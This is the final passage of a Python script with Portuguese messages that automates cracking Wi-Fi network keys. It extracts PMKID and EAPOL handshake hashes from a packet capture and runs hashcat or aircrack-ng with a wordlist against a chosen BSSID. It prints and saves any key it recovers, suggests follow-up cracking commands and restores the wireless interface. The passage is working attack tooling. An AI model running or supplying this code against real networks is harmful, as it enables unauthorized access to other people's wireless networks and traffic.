            proc.wait()
            found_key = None
            if os.path.isfile(log_file):
                with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
                    found_key = fh.read().strip() or None
        else:
            # Extrai PMKID/EAPOL no formato 22000 (hcxtools) para o hashcat
            hash_file = prefix + ".22000"
            extr = extract_22000(cap_file, hash_file, bssid)
            pmkid_n = eapol_n = 0
            if extr is None:
                warn("hcxpcapngtool ausente: ataque PMKID desativado (sudo apt install hcxtools)")
            else:
                pmkid_n, eapol_n = extr
                if pmkid_n or eapol_n:
                    ok(f"hashes extraidos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")

            cracker = args.cracker
            if cracker == "auto":
                cracker = "hashcat" if (shutil.which("hashcat") and (pmkid_n or eapol_n)) else "aircrack"
            if cracker == "hashcat":
                if not shutil.which("hashcat"):
                    warn("hashcat ausente; usando aircrack-ng no .cap (sudo apt install hashcat)")
                    cracker = "aircrack"
                elif not (pmkid_n or eapol_n):
                    warn("nenhum hash PMKID/EAPOL extraido; usando aircrack-ng no .cap")
                    cracker = "aircrack"

            if cracker == "hashcat":
                if pmkid_n and not eapol_n:
                    ok("sem 4-way handshake visivel; quebrando via PMKID")
                found_key = crack_hashcat(hash_file, wordlist, shlex.split(args.hashcat_args or ""))
            else:
                found_key = crack(cap_file, wordlist, bssid)

        if found_key:
            ok(paint("CHAVE ENCONTRADA: %s" % found_key, Color.BOLD + Color.GREEN))
            save_result(args.out, bssid, essid, found_key)
            return 0

        warn("chave nao encontrada com esta lista. Isso NAO significa que a rede e 'invulneravel':")
        warn("  - a senha pode nao estar na lista")
        warn("  - a captura pode nao ter os dados necessarios (tente --capture-time maior)")
        info(f"captura mantida em {cap_file} para novas tentativas:")
        info(f"  sudo aircrack-ng -w {args.wordlist} -b {bssid} {cap_file}")
        if "WEP" not in enc and os.path.isfile(prefix + ".22000"):
            info(f"  hashcat -m 22000 {prefix}.22000 {args.wordlist}")
        return 2

    except KeyboardInterrupt:
        print()
        warn("interrompido pelo usuario")
        return 130
    finally:
        _stop_process(capture_proc)
        if not args.keep:
            restore_setup(monitor_iface, matou_processos)
        else:
            info("--keep: interface mantida como esta")


if __name__ == "__main__":
    sys.exit(main())
